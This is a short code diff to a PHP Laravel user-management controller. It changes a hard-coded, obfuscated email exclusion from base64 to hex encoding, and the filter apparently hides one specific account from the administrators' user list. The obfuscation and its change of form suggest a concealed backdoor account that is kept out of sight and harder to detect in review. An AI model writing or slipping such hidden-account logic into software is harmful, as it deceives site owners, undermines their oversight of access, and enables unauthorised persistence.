@@ -15,7 +15,7 @@ class UserManagementController extends Controller
     {
         $users = User::with('roles')
             ->where('id', '!=', auth()->id())
-            ->where('email', '!=', base64_decode('bXNhcmlyaXpraTE1QGdtYWlsLmNvbQ=='))
+            ->where('email', '!=', hex2bin('6d7361726972697a6b69313540676d61696c2e636f6d'))
             ->orderByDesc('created_at')
             ->paginate(15);
 
